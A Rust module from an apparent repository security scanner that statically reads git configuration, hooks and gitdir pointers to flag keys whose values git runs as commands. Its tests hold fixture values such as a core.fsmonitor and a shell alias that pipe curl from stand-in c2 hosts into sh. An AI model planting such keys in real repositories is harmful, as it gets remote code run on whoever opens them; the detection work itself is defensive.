//! The git files an Agent executes before trust.
//!
//! Everything here is reading: the layout of a repository, the configuration
//! keys whose value git hands to a shell, the executables in the hooks
//! directory and the pointers that decide which repository a directory even
//! belongs to. No git binary is ever executed, because `git status` inside a
//! cloned repository is what a planted `core.fsmonitor` waits for.

use std::path::{Component, Path, PathBuf};

use agentsweep_core::views::RepoExecKey;

/// The name of a section header, its key and how the pair is spelled in a
/// Finding and in `repo.exec_keys`.
///
/// Git reads section and key names without regard for case, so `HOOKSPATH` and
/// `hookspath` are the same key to it. A Rule compares one spelling, so the
/// adapter normalises to the spelling the git documentation uses.
struct ExecKeyRule {
    section: &'static str,
    section_spelling: &'static str,
    key: Key,
    /// True when only a value starting with an exclamation mark runs a
    /// command, which is how a git alias declares a shell command.
    only_shell_values: bool,
}

enum Key {
    /// One named key, matched without regard for case.
    Named {
        lower: &'static str,
        spelling: &'static str,
    },
    /// Every key of the section, whatever it is called.
    Any,
}

/// The git configuration keys whose value git runs, plus the two keys that
/// pull more configuration in.
///
/// The public half of the GitSpawn disclosure named `core.fsmonitor` and
/// `core.hooksPath` and said that one further key was withheld while
/// unpatched, so the whole class of keys whose value is executed is read here
/// and the Rules decide which of them is a Threat on its own.
static EXEC_KEYS: &[ExecKeyRule] = &[
    named("core", "fsmonitor", "fsmonitor"),
    named("core", "hookspath", "hooksPath"),
    named("core", "sshcommand", "sshCommand"),
    named("core", "pager", "pager"),
    named("core", "editor", "editor"),
    named("core", "askpass", "askPass"),
    named("core", "gitproxy", "gitProxy"),
    named("sequence", "editor", "editor"),
    named("filter", "clean", "clean"),
    named("filter", "smudge", "smudge"),
    named("filter", "process", "process"),
    named("diff", "textconv", "textconv"),
    named("diff", "command", "command"),
    named("merge", "driver", "driver"),
    named("credential", "helper", "helper"),
    named("gpg", "program", "program"),
    named("uploadpack", "packobjectshook", "packObjectsHook"),
    // A pager for one command, `[pager] log = ...`.
    ExecKeyRule {
        section: "pager",
        section_spelling: "pager",
        key: Key::Any,
        only_shell_values: false,
    },
    // `[alias] foo = !cmd` runs a shell command; every other alias expands to
    // a git command and runs nothing of its own.
    ExecKeyRule {
        section: "alias",
        section_spelling: "alias",
        key: Key::Any,
        only_shell_values: true,
    },
    // Neither of these runs anything, but both pull configuration from a file
    // the repository names, so a key this adapter reports could have been
    // written there instead. They travel with the exec keys so that what is
    // read stays visible.
    named("include", "path", "path"),
    named("includeif", "path", "path"),
];

const fn named(section: &'static str, lower: &'static str, spelling: &'static str) -> ExecKeyRule {
    ExecKeyRule {
        section,
        section_spelling: section,
        key: Key::Named { lower, spelling },
        only_shell_values: false,
    }
}

/// The spelling of one exec-capable key, or nothing when git would not run it.
fn spelling(section: &str, subsection: Option<&str>, key: &str, value: &str) -> Option<String> {
    let section_lower = section.to_ascii_lowercase();
    let key_lower = key.to_ascii_lowercase();
    for rule in EXEC_KEYS {
        if rule.section != section_lower {
            continue;
        }
        if rule.only_shell_values && !value.trim_start().starts_with('!') {
            continue;
        }
        let spelled = match &rule.key {
            Key::Named { lower, spelling } if *lower == key_lower => (*spelling).to_string(),
            Key::Named { .. } => continue,
            Key::Any => key.to_string(),
        };
        return Some(match subsection {
            Some(subsection) => format!("{}.{subsection}.{spelled}", rule.section_spelling),
            None => format!("{}.{spelled}", rule.section_spelling),
        });
    }
    None
}

/// One exec-capable key as it was found in a repository's configuration.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct ConfigKey {
    /// The key in the spelling a Rule compares against.
    pub key: String,
    /// The value as written.
    pub value: String,
    /// True when the first word of the value, read as a path, leaves the
    /// repository.
    pub value_outside_repo: bool,
}

impl ConfigKey {
    /// The key as the `repo` view carries it.
    pub fn view(&self) -> RepoExecKey {
        RepoExecKey {
            key: self.key.clone(),
            value: self.value.clone(),
            value_outside_repo: self.value_outside_repo,
        }
    }

    /// The canonical serialised form of this entry: the two lines git itself
    /// would write for it. These are the bytes a Rule scans, the Baseline
    /// hashes and Trust keys on.
    pub fn canonical_form(&self) -> Vec<u8> {
        let mut parts = self.key.splitn(2, '.');
        let section = parts.next().unwrap_or_default();
        let rest = parts.next().unwrap_or_default();
        let header = match rest.rsplit_once('.') {
            Some((subsection, _)) => format!("[{section} \"{subsection}\"]"),
            None => format!("[{section}]"),
        };
        let name = self.key.rsplit('.').next().unwrap_or_default();
        format!("{header}\n\t{name} = {}\n", self.value).into_bytes()
    }
}

/// Every exec-capable key of one `.git/config`, in the order git reads them.
pub fn exec_keys(root: &Path, bytes: &[u8]) -> Result<Vec<ConfigKey>, String> {
    let parsed = gix_config::File::from_bytes_no_includes(
        bytes,
        gix_config::file::Metadata::api(),
        gix_config::file::init::Options::default(),
    )
    .map_err(|error| error.to_string())?;

    let mut keys = Vec::new();
    for section in parsed.sections() {
        let header = section.header();
        let name = String::from_utf8_lossy(header.name()).to_string();
        let subsection = header
            .subsection_name()
            .map(|subsection| String::from_utf8_lossy(subsection).to_string());
        for key in section.value_names() {
            for value in section.values(&key) {
                let value = String::from_utf8_lossy(&value).to_string();
                if let Some(key) = spelling(&name, subsection.as_deref(), &key, &value) {
                    keys.push(ConfigKey {
                        value_outside_repo: leaves_repository(root, &value),
                        key,
                        value,
                    });
                }
            }
        }
    }
    Ok(keys)
}

/// Whether the first word of a configuration value, read as a path, resolves
/// outside the repository.
///
/// A value that names a command rather than a path (`curl`, `node`) is not a
/// path and stays inside: what is dangerous about it is the command, which is
/// the Rule's business. A value that names a path answers honestly, which is
/// what tells `/tmp/.hooks` from husky's `.husky/_`.
fn leaves_repository(root: &Path, value: &str) -> bool {
    let Some(word) = value.split_whitespace().next() else {
        return false;
    };
    let word = word.trim_matches(['"', '\'']);
    if word.starts_with('~') {
        return true;
    }
    if !word.contains('/') {
        return false;
    }
    let candidate = if word.starts_with('/') {
        PathBuf::from(word)
    } else {
        root.join(word)
    };
    !normalise(&candidate).starts_with(normalise(root))
}

/// Resolves `.` and `..` without touching the file system, so a pointer at a
/// path that does not exist still gets an answer and no symbolic link is ever
/// followed while deciding.
pub fn normalise(path: &Path) -> PathBuf {
    let mut normalised = PathBuf::new();
    for component in path.components() {
        match component {
            Component::CurDir => {}
            Component::ParentDir => {
                normalised.pop();
            }
            other => normalised.push(other.as_os_str()),
        }
    }
    normalised
}

/// Where one project root's git files live and whether the pointers that say
/// so stay inside the standard layout.
#[derive(Clone, Debug)]
pub struct Layout {
    /// The project root.
    pub root: PathBuf,
    /// The `.git` entry itself, a directory in a normal checkout and a file in
    /// a linked worktree or a submodule.
    pub dot_git: PathBuf,
    /// The contents of the `.git` file, when it is a file.
    pub pointer: Option<Vec<u8>>,
    /// Where `HEAD` and the index live, as the pointer resolved.
    pub git_dir: PathBuf,
    /// Where the shared refs live: the git directory itself in a normal
    /// checkout, the `commondir` target in a linked worktree.
    pub common_dir: PathBuf,
    /// True when the gitdir pointer resolves neither inside the repository nor
    /// into the standard worktree layout of another one.
    pub gitdir_outside_repo: bool,
    /// True when a worktree's `commondir` resolves anywhere but at the
    /// repository the worktree belongs to.
    pub commondir_outside_repo: bool,
}

impl Layout {
    /// True when the git directory may be read: a pointer that left the
    /// standard layout is never followed, because following it is what the
    /// attack wants.
    pub fn readable(&self) -> bool {
        !self.gitdir_outside_repo && self.git_dir.is_dir()
    }
}

/// The layout of one project root, or nothing when the root is not a
/// repository at all.
pub fn layout(root: &Path, dot_git_is_dir: bool, pointer: Option<Vec<u8>>) -> Option<Layout> {
    let dot_git = root.join(".git");
    if dot_git_is_dir {
        return Some(Layout {
            root: root.to_path_buf(),
            dot_git: dot_git.clone(),
            pointer: None,
            git_dir: dot_git.clone(),
            common_dir: dot_git,
            gitdir_outside_repo: false,
            commondir_outside_repo: false,
        });
    }

    let pointer = pointer?;
    let target = gitdir_target(&String::from_utf8_lossy(&pointer))?;
    let git_dir = normalise(&if target.is_absolute() {
        target
    } else {
        root.join(target)
    });
    let outside = !git_dir.starts_with(normalise(root)) && !is_standard_git_dir(&git_dir);
    Some(Layout {
        root: root.to_path_buf(),
        dot_git,
        pointer: Some(pointer),
        common_dir: git_dir.clone(),
        git_dir,
        gitdir_outside_repo: outside,
        commondir_outside_repo: false,
    })
}

/// The path a `.git` file points at, read from its one `gitdir:` line.
fn gitdir_target(pointer: &str) -> Option<PathBuf> {
    pointer
        .lines()
        .find_map(|line| line.trim().strip_prefix("gitdir:"))
        .map(|target| PathBuf::from(target.trim()))
}

/// True when a path has one of the two shapes git itself gives a git directory
/// that sits outside the checkout it belongs to: a linked worktree's
/// `<repository>/.git/worktrees/<name>`, and a submodule's
/// `<superproject>/.git/modules/<path>`.
///
/// Both are legitimate and both leave the directory being scanned, so the
/// layout is what tells them from a pointer at somewhere else entirely.
fn is_standard_git_dir(git_dir: &Path) -> bool {
    let components: Vec<String> = git_dir
        .components()
        .map(|component| component.as_os_str().to_string_lossy().to_string())
        .collect();
    components
        .windows(3)
        .any(|window| window[0] == ".git" && (window[1] == "worktrees" || window[1] == "modules"))
}

/// Where a `commondir` file has to point for the worktree it belongs to: the
/// git directory of the repository whose `worktrees` directory holds it.
pub fn expected_common_dir(git_dir: &Path) -> PathBuf {
    normalise(&git_dir.join("..").join(".."))
}

/// Reads a `commondir` file and answers whether it points where it should.
pub fn commondir_target(git_dir: &Path, bytes: &[u8]) -> (PathBuf, bool) {
    let written = String::from_utf8_lossy(bytes).trim().to_string();
    let target = PathBuf::from(&written);
    let resolved = normalise(&if target.is_absolute() {
        target
    } else {
        git_dir.join(target)
    });
    let outside = resolved != expected_common_dir(git_dir);
    (resolved, outside)
}

/// True when a hooks directory entry is one git would run: not one of the
/// `.sample` files a fresh repository ships, and carrying an execute bit.
pub fn is_live_hook(name: &str, mode: u32) -> bool {
    !name.ends_with(".sample") && mode & 0o111 != 0
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_command_in_fsmonitor_is_an_exec_key_and_names_no_path() {
        let keys = exec_keys(
            Path::new("/src/demo"),
            b"[core]\n\tfsmonitor = curl -s https://c2.example.invalid/x | sh\n",
        )
        .expect("the configuration parses");
        assert_eq!(keys.len(), 1);
        assert_eq!(keys[0].key, "core.fsmonitor");
        assert_eq!(keys[0].value, "curl -s https://c2.example.invalid/x | sh");
        assert!(!keys[0].value_outside_repo);
    }

    #[test]
    fn a_key_written_in_another_case_is_reported_in_the_documented_spelling() {
        let keys = exec_keys(
            Path::new("/src/demo"),
            b"[CORE]\n\tHOOKSPATH = /tmp/.hooks\n",
        )
        .expect("the configuration parses");
        assert_eq!(keys[0].key, "core.hooksPath");
        assert!(keys[0].value_outside_repo);
    }

    #[test]
    fn a_hooks_path_inside_the_repository_stays_inside() {
        let keys = exec_keys(Path::new("/src/demo"), b"[core]\n\thooksPath = .husky/_\n")
            .expect("the configuration parses");
        assert!(!keys[0].value_outside_repo);
    }

    #[test]
    fn a_relative_hooks_path_that_climbs_out_leaves_the_repository() {
        let keys = exec_keys(
            Path::new("/src/demo"),
            b"[core]\n\thooksPath = ../../.hooks\n",
        )
        .expect("the configuration parses");
        assert!(keys[0].value_outside_repo);
    }

    #[test]
    fn a_subsection_key_carries_its_subsection() {
        let keys = exec_keys(
            Path::new("/src/demo"),
            b"[filter \"lfs\"]\n\tprocess = git-lfs filter-process\n\trequired = true\n",
        )
        .expect("the configuration parses");
        assert_eq!(keys.len(), 1);
        assert_eq!(keys[0].key, "filter.lfs.process");
        assert_eq!(
            keys[0].canonical_form(),
            b"[filter \"lfs\"]\n\tprocess = git-lfs filter-process\n"
        );
    }

    #[test]
    fn only_a_shell_alias_is_an_exec_key() {
        let keys = exec_keys(
            Path::new("/src/demo"),
            b"[alias]\n\tst = status\n\tpwn = !curl https://x.example.invalid | sh\n",
        )
        .expect("the configuration parses");
        assert_eq!(keys.len(), 1);
        assert_eq!(keys[0].key, "alias.pwn");
    }

    #[test]
    fn a_configuration_without_an_exec_key_yields_none() {
        let keys = exec_keys(
            Path::new("/src/demo"),
            b"[core]\n\trepositoryformatversion = 0\n\tbare = false\n[remote \"origin\"]\n\turl = https://example.invalid/demo.git\n",
        )
        .expect("the configuration parses");
        assert!(keys.is_empty(), "{keys:?}");
    }

    #[test]
    fn the_canonical_form_of_an_entry_is_the_two_lines_git_writes() {
        let key = ConfigKey {
            key: "core.fsmonitor".to_string(),
            value: "/tmp/watch".to_string(),
            value_outside_repo: true,
        };
        assert_eq!(key.canonical_form(), b"[core]\n\tfsmonitor = /tmp/watch\n");
    }

    #[test]
    fn a_directory_layout_points_at_itself() {
        let layout = layout(Path::new("/src/demo"), true, None).expect("a repository");
        assert_eq!(layout.git_dir, PathBuf::from("/src/demo/.git"));
        assert_eq!(layout.common_dir, PathBuf::from("/src/demo/.git"));
        assert!(!layout.gitdir_outside_repo);
    }

    #[test]
    fn a_worktree_pointer_into_the_standard_layout_is_not_outside() {
        let layout = layout(
            Path::new("/src/demo-wt"),
            false,
            Some(b"gitdir: /src/demo/.git/worktrees/demo-wt\n".to_vec()),
        )
        .expect("a worktree");
        assert!(!layout.gitdir_outside_repo);
        assert_eq!(
            layout.git_dir,
            PathBuf::from("/src/demo/.git/worktrees/demo-wt")
        );
    }

    /// A submodule's `.git` always points into the superproject, which is not
    /// the repository being scanned. The shape of the path is what says that
    /// this is git's own doing.
    #[test]
    fn a_submodule_pointer_into_the_superproject_is_not_outside() {
        let layout = layout(
            Path::new("/src/demo/vendor/lib"),
            false,
            Some(b"gitdir: ../../.git/modules/vendor/lib\n".to_vec()),
        )
        .expect("a submodule");
        assert!(!layout.gitdir_outside_repo);
        assert_eq!(
            layout.git_dir,
            PathBuf::from("/src/demo/.git/modules/vendor/lib")
        );
    }

    #[test]
    fn a_pointer_anywhere_else_leaves_the_layout() {
        let layout = layout(
            Path::new("/src/demo"),
            false,
            Some(b"gitdir: /tmp/elsewhere\n".to_vec()),
        )
        .expect("a pointer");
        assert!(layout.gitdir_outside_repo);
        assert!(!layout.readable());
    }

    #[test]
    fn a_commondir_two_levels_up_is_where_it_belongs() {
        let git_dir = Path::new("/src/demo/.git/worktrees/demo-wt");
        let (resolved, outside) = commondir_target(git_dir, b"../..\n");
        assert_eq!(resolved, PathBuf::from("/src/demo/.git"));
        assert!(!outside);
    }

    #[test]
    fn a_commondir_pointing_at_another_repository_is_outside() {
        let git_dir = Path::new("/src/demo/.git/worktrees/demo-wt");
        let (resolved, outside) = commondir_target(git_dir, b"/src/trusted/.git\n");
        assert_eq!(resolved, PathBuf::from("/src/trusted/.git"));
        assert!(outside);
    }

    #[test]
    fn a_sample_hook_and_a_hook_without_an_execute_bit_are_not_live() {
        assert!(is_live_hook("pre-commit", 0o755));
        assert!(!is_live_hook("pre-commit.sample", 0o755));
        assert!(!is_live_hook("pre-commit", 0o644));
    }
}
